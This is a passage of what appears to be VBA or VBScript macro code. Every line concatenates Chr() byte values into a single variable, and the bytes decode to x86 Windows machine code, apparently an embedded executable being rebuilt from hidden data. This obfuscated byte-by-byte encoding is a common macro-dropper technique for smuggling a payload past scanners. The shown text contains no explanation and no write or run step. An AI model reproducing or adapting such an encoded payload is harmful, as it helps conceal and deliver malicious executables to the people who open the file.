gfoN=gfoN&Chr(114)&Chr(178)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(238)&Chr(2)&Chr(131)&Chr(239)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(238)&Chr(3)&Chr(131)&Chr(239)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(15)&Chr(130)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)
gfoN=gfoN&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(100)&Chr(102)&Chr(64)&Chr(0)&Chr(108)&Chr(102)&Chr(64)&Chr(0)&Chr(116)&Chr(102)&Chr(64)&Chr(0)&Chr(124)&Chr(102)&Chr(64)&Chr(0)&Chr(132)&Chr(102)&Chr(64)&Chr(0)&Chr(140)&Chr(102)&Chr(64)&Chr(0)&Chr(148)&Chr(102)&Chr(64)&Chr(0)&Chr(167)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(28)&Chr(137)&Chr(68)&Chr(143)&Chr(28)&Chr(139)&Chr(68)&Chr(142)&Chr(24)&Chr(137)&Chr(68)&Chr(143)&Chr(24)&Chr(139)&Chr(68)&Chr(142)&Chr(20)&Chr(137)&Chr(68)&Chr(143)&Chr(20)&Chr(139)&Chr(68)&Chr(142)&Chr(16)&Chr(137)&Chr(68)&Chr(143)&Chr(16)&Chr(139)&Chr(68)&Chr(142)&Chr(12)&Chr(137)&Chr(68)&Chr(143)&Chr(12)&Chr(139)&Chr(68)&Chr(142)&Chr(8)&Chr(137)&Chr(68)&Chr(143)&Chr(8)&Chr(139)&Chr(68)&Chr(142)&Chr(4)&Chr(137)&Chr(68)&Chr(143)&Chr(4)&Chr(141)&Chr(4)&Chr(141)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(192)&Chr(102)&Chr(64)&Chr(0)&Chr(200)&Chr(102)&Chr(64)&Chr(0)&Chr(216)&Chr(102)&Chr(64)&Chr(0)&Chr(236)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)
gfoN=gfoN&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(163)&Chr(208)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(13)&Chr(204)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(21)&Chr(200)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(29)&Chr(196)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(192)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(61)&Chr(188)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(21)&Chr(232)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(13)&Chr(220)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(29)&Chr(184)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(5)&Chr(180)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(37)&Chr(176)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(45)&Chr(172)&Chr(179)&Chr(64)&Chr(0)&Chr(156)&Chr(143)&Chr(5)&Chr(224)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(0)&Chr(163)
gfoN=gfoN&Chr(212)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(4)&Chr(163)&Chr(216)&Chr(179)&Chr(64)&Chr(0)&Chr(141)&Chr(69)&Chr(8)&Chr(163)&Chr(228)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(133)&Chr(224)&Chr(252)&Chr(255)&Chr(255)&Chr(199)&Chr(5)&Chr(32)&Chr(179)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(161)&Chr(216)&Chr(179)&Chr(64)&Chr(0)&Chr(163)&Chr(212)&Chr(178)&Chr(64)&Chr(0)&Chr(199)&Chr(5)&Chr(200)&Chr(178)&Chr(64)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(192)&Chr(199)&Chr(5)&Chr(204)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(161)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(156)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(24)&Chr(179)&Chr(64)&Chr(0)&Chr(106)
gfoN=gfoN&Chr(1)&Chr(232)&Chr(136)&Chr(234)&Chr(255)&Chr(255)&Chr(89)&Chr(106)&Chr(0)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(28)&Chr(146)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(152)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(61)&Chr(24)&Chr(179)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(8)&Chr(106)&Chr(1)&Chr(232)&Chr(100)&Chr(234)&Chr(255)&Chr(255)&Chr(89)&Chr(104)&Chr(9)&Chr(4)&Chr(0)&Chr(192)&Chr(255)&Chr(21)&Chr(148)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(144)&Chr(128)&Chr(64)&Chr(0)&Chr(201)&Chr(195)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(87)&Chr(85)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(104)&Chr(36)&Chr(104)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(250)&Chr(9)&Chr(0)&Chr(0)&Chr(93)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(76)&Chr(36)&Chr(4)
gfoN=gfoN&Chr(247)&Chr(65)&Chr(4)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(50)&Chr(139)&Chr(68)&Chr(36)&Chr(20)&Chr(139)&Chr(72)&Chr(252)&Chr(51)&Chr(200)&Chr(232)&Chr(146)&Chr(231)&Chr(255)&Chr(255)&Chr(85)&Chr(139)&Chr(104)&Chr(16)&Chr(139)&Chr(80)&Chr(40)&Chr(82)&Chr(139)&Chr(80)&Chr(36)&Chr(82)&Chr(232)&Chr(20)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(8)&Chr(93)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(137)&Chr(2)&Chr(184)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(83)&Chr(86)&Chr(87)&Chr(139)&Chr(68)&Chr(36)&Chr(16)&Chr(85)&Chr(80)&Chr(106)&Chr(254)&Chr(28)&Chr(44)&Chr(104)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(196)&Chr(80)&Chr(141)&Chr(68)&Chr(36)&Chr(4)
gfoN=gfoN&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(40)&Chr(139)&Chr(88)&Chr(8)&Chr(139)&Chr(112)&Chr(12)&Chr(131)&Chr(254)&Chr(255)&Chr(116)&Chr(58)&Chr(131)&Chr(124)&Chr(36)&Chr(44)&Chr(255)&Chr(116)&Chr(6)&Chr(59)&Chr(116)&Chr(36)&Chr(44)&Chr(118)&Chr(45)&Chr(141)&Chr(52)&Chr(118)&Chr(139)&Chr(12)&Chr(179)&Chr(137)&Chr(76)&Chr(36)&Chr(12)&Chr(137)&Chr(72)&Chr(12)&Chr(131)&Chr(124)&Chr(179)&Chr(4)&Chr(0)&Chr(117)&Chr(23)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(179)&Chr(8)&Chr(232)&Chr(73)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(179)&Chr(8)&Chr(232)&Chr(95)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(183)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(95)&Chr(94)&Chr(91)&Chr(195)&Chr(51)&Chr(192)&Chr(100)
gfoN=gfoN&Chr(139)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(121)&Chr(4)&Chr(44)&Chr(104)&Chr(64)&Chr(0)&Chr(117)&Chr(16)&Chr(139)&Chr(81)&Chr(12)&Chr(139)&Chr(82)&Chr(12)&Chr(57)&Chr(81)&Chr(8)&Chr(117)&Chr(5)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(83)&Chr(81)&Chr(187)&Chr(32)&Chr(171)&Chr(64)&Chr(0)&Chr(235)&Chr(11)&Chr(83)&Chr(81)&Chr(187)&Chr(32)&Chr(171)&Chr(64)&Chr(0)&Chr(139)&Chr(76)&Chr(36)&Chr(12)&Chr(137)&Chr(75)&Chr(8)&Chr(137)&Chr(67)&Chr(4)&Chr(137)&Chr(107)&Chr(12)&Chr(85)&Chr(81)&Chr(80)&Chr(88)&Chr(89)&Chr(93)&Chr(89)&Chr(91)&Chr(194)&Chr(4)&Chr(0)&Chr(255)&Chr(208)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(4)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(12)&Chr(193)&Chr(233)&Chr(7)&Chr(102)&Chr(15)&Chr(239)&Chr(192)&Chr(235)&Chr(8)&Chr(141)
gfoN=gfoN&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(102)&Chr(15)&Chr(127)&Chr(7)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(16)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(32)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(48)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(64)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(80)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(96)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(112)&Chr(141)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(208)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(69)&Chr(8)&Chr(153)&Chr(139)&Chr(248)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(131)&Chr(231)&Chr(15)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(133)&Chr(255)&Chr(117)&Chr(60)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(209)&Chr(131)&Chr(226)&Chr(127)
gfoN=gfoN&Chr(137)&Chr(85)&Chr(244)&Chr(59)&Chr(202)&Chr(116)&Chr(18)&Chr(43)&Chr(202)&Chr(81)&Chr(80)&Chr(232)&Chr(115)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(85)&Chr(244)&Chr(133)&Chr(210)&Chr(116)&Chr(69)&Chr(3)&Chr(69)&Chr(16)&Chr(43)&Chr(194)&Chr(137)&Chr(69)&Chr(248)&Chr(51)&Chr(192)&Chr(139)&Chr(125)&Chr(248)&Chr(139)&Chr(77)&Chr(244)&Chr(243)&Chr(170)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(46)&Chr(247)&Chr(223)&Chr(131)&Chr(199)&Chr(16)&Chr(137)&Chr(125)&Chr(240)&Chr(51)&Chr(192)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(240)&Chr(243)&Chr(170)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(85)&Chr(16)&Chr(3)&Chr(200)&Chr(43)&Chr(208)&Chr(82)&Chr(106)&Chr(0)&Chr(81)&Chr(232)&Chr(126)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(125)
gfoN=gfoN&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(141)&Chr(77)&Chr(232)&Chr(232)&Chr(17)&Chr(203)&Chr(255)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(141)&Chr(67)&Chr(1)&Chr(61)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(119)&Chr(15)&Chr(139)&Chr(69)&Chr(232)&Chr(139)&Chr(128)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(88)&Chr(235)&Chr(117)&Chr(137)&Chr(93)&Chr(8)&Chr(193)&Chr(125)&Chr(8)&Chr(8)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(139)&Chr(69)&Chr(8)&Chr(37)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(167)&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(18)&Chr(138)&Chr(69)&Chr(8)&Chr(106)&Chr(2)&Chr(136)&Chr(69)&Chr(248)&Chr(136)&Chr(93)&Chr(249)&Chr(198)&Chr(69)&Chr(250)&Chr(0)&Chr(89)
gfoN=gfoN&Chr(235)&Chr(10)&Chr(51)&Chr(201)&Chr(136)&Chr(93)&Chr(248)&Chr(198)&Chr(69)&Chr(249)&Chr(0)&Chr(65)&Chr(139)&Chr(69)&Chr(232)&Chr(106)&Chr(1)&Chr(255)&Chr(112)&Chr(20)&Chr(255)&Chr(112)&Chr(4)&Chr(141)&Chr(69)&Chr(252)&Chr(80)&Chr(81)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(141)&Chr(69)&Chr(232)&Chr(106)&Chr(1)&Chr(80)&Chr(232)&Chr(167)&Chr(238)&Chr(255)&Chr(148)&Chr(131)&Chr(196)&Chr(32)&Chr(133)&Chr(192)&Chr(117)&Chr(16)&Chr(56)&Chr(69)&Chr(244)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(240)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(235)&Chr(20)&Chr(15)&Chr(183)&Chr(69)&Chr(252)&Chr(35)&Chr(69)&Chr(12)&Chr(128)&Chr(125)&Chr(244)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(240)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(91)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)
gfoN=gfoN&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(8)&Chr(43)&Chr(200)&Chr(131)&Chr(225)&Chr(15)&Chr(3)&Chr(193)&Chr(27)&Chr(201)&Chr(11)&Chr(193)&Chr(89)&Chr(233)&Chr(106)&Chr(2)&Chr(0)&Chr(0)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(8)&Chr(43)&Chr(200)&Chr(131)&Chr(225)&Chr(7)&Chr(3)&Chr(193)&Chr(27)&Chr(201)&Chr(11)&Chr(193)&Chr(89)&Chr(233)&Chr(84)&Chr(2)&Chr(0)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(106)&Chr(6)&Chr(141)&Chr(69)&Chr(244)&Chr(80)&Chr(104)&Chr(4)&Chr(16)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(198)&Chr(69)&Chr(250)&Chr(0)&Chr(255)&Chr(21)&Chr(204)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(5)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(10)&Chr(141)
gfoN=gfoN&Chr(69)&Chr(244)&Chr(80)&Chr(232)&Chr(249)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(123)&Chr(228)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(52)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(139)&Chr(69)&Chr(16)&Chr(139)&Chr(77)&Chr(24)&Chr(137)&Chr(69)&Chr(216)&Chr(139)&Chr(69)&Chr(20)&Chr(83)&Chr(137)&Chr(69)&Chr(208)&Chr(139)&Chr(0)&Chr(86)&Chr(137)&Chr(69)&Chr(220)&Chr(139)&Chr(69)&Chr(8)&Chr(87)&Chr(51)&Chr(255)&Chr(137)&Chr(77)&Chr(204)&Chr(137)&Chr(125)&Chr(224)&Chr(137)&Chr(125)&Chr(212)&Chr(59)&Chr(69)&Chr(12)&Chr(15)&Chr(132)&Chr(95)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(168)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(77)&Chr(232)&Chr(81)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(29)
gfoN=gfoN&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(94)&Chr(131)&Chr(125)&Chr(232)&Chr(1)&Chr(117)&Chr(88)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(75)&Chr(131)&Chr(125)&Chr(232)&Chr(1)&Chr(117)&Chr(69)&Chr(139)&Chr(117)&Chr(220)&Chr(199)&Chr(69)&Chr(212)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(254)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(216)&Chr(232)&Chr(36)&Chr(200)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(89)&Chr(70)&Chr(59)&Chr(247)&Chr(126)&Chr(91)&Chr(129)&Chr(254)&Chr(240)&Chr(255)&Chr(255)&Chr(127)&Chr(119)&Chr(83)&Chr(141)&Chr(68)&Chr(54)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(47)&Chr(232)&Chr(228)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(196)&Chr(59)&Chr(199)&Chr(116)&Chr(56)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(235)&Chr(45)&Chr(87)&Chr(87)&Chr(255)&Chr(117)&Chr(220)&Chr(255)&Chr(117)&Chr(216)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(211)&Chr(139)&Chr(240)&Chr(59)&Chr(247)&Chr(117)&Chr(195)&Chr(51)&Chr(192)&Chr(233)&Chr(209)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(175)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(59)&Chr(199)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(137)&Chr(69)&Chr(228)&Chr(235)&Chr(3)&Chr(137)&Chr(125)&Chr(228)&Chr(57)&Chr(125)&Chr(228)&Chr(116)&Chr(216)&Chr(141)&Chr(4)&Chr(54)&Chr(80)&Chr(87)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(12)&Chr(230)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(117)&Chr(220)&Chr(255)&Chr(117)&Chr(216)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(211)&Chr(133)&Chr(192)&Chr(116)&Chr(127)
gfoN=gfoN&Chr(139)&Chr(93)&Chr(204)&Chr(59)&Chr(223)&Chr(116)&Chr(29)&Chr(87)&Chr(87)&Chr(255)&Chr(117)&Chr(28)&Chr(83)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(21)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(96)&Chr(137)&Chr(93)&Chr(224)&Chr(235)&Chr(91)&Chr(139)&Chr(29)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(57)&Chr(125)&Chr(212)&Chr(117)&Chr(20)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(211)&Chr(139)&Chr(240)&Chr(59)&Chr(247)&Chr(116)&Chr(60)&Chr(86)&Chr(106)&Chr(1)&Chr(232)&Chr(47)&Chr(209)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(116)&Chr(43)&Chr(87)&Chr(87)&Chr(86)&Chr(80)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(211)&Chr(59)&Chr(199)
gfoN=gfoN&Chr(117)&Chr(14)&Chr(255)&Chr(117)&Chr(224)&Chr(232)&Chr(57)&Chr(208)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(224)&Chr(235)&Chr(11)&Chr(131)&Chr(125)&Chr(220)&Chr(255)&Chr(116)&Chr(5)&Chr(139)&Chr(77)&Chr(208)&Chr(137)&Chr(1)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(147)&Chr(230)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(69)&Chr(224)&Chr(141)&Chr(101)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(199)&Chr(226)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(34)&Chr(200)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(69)&Chr(8)&Chr(139)&Chr(77)&Chr(240)&Chr(139)&Chr(137)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(65)&Chr(37)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(128)&Chr(125)
gfoN=gfoN&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(10)&Chr(106)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(104)&Chr(2)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(200)&Chr(27)&Chr(192)&Chr(247)&Chr(208)&Chr(35)&Chr(200)&Chr(139)&Chr(196)&Chr(37)&Chr(0)&Chr(240)&Chr(255)&Chr(255)&Chr(59)&Chr(200)&Chr(114)&Chr(10)&Chr(139)&Chr(193)&Chr(89)&Chr(148)&Chr(139)&Chr(0)&Chr(137)&Chr(4)&Chr(36)&Chr(195)&Chr(45)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(133)&Chr(0)&Chr(235)&Chr(233)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(86)&Chr(87)&Chr(255)&Chr(117)&Chr(8)
gfoN=gfoN&Chr(141)&Chr(77)&Chr(236)&Chr(232)&Chr(158)&Chr(199)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(16)&Chr(139)&Chr(117)&Chr(12)&Chr(51)&Chr(255)&Chr(59)&Chr(199)&Chr(116)&Chr(2)&Chr(137)&Chr(48)&Chr(59)&Chr(247)&Chr(117)&Chr(44)&Chr(232)&Chr(19)&Chr(190)&Chr(255)&Chr(255)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(155)&Chr(189)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(128)&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(233)&Chr(216)&Chr(1)&Chr(0)&Chr(0)&Chr(57)&Chr(125)&Chr(20)&Chr(116)&Chr(12)&Chr(131)&Chr(125)&Chr(20)&Chr(2)&Chr(124)&Chr(201)&Chr(131)&Chr(125)&Chr(20)&Chr(36)&Chr(127)&Chr(195)&Chr(139)&Chr(77)&Chr(236)&Chr(83)&Chr(138)&Chr(30)&Chr(137)&Chr(125)&Chr(252)&Chr(141)&Chr(126)&Chr(1)&Chr(131)
